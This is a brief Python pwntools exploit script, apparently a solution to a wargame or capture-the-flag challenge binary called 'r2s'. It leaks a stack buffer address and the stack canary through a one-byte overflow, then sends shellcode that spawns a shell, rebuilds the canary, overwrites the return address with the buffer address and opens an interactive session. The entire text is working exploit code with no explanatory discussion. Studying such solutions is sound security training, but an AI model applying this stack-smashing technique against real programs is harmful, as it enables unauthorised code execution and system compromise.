from pwn import *

p = process("r2s")

context.arch = "amd64"

buf = int(p.recvline().split()[-1],16)


payload = b'a'*0x59

p.sendafter("Input: ",payload)
p.recvuntil(payload)

canary = u64(b'\00'+p.recv(7))
sh = asm(shellcraft.sh())

payload = sh
payload += b'a'*(0x58-len(sh))
payload += p64(canary)
payload += b'b'*8
payload += p64(buf)

p.sendafter("Input: ",payload)

p.interactive()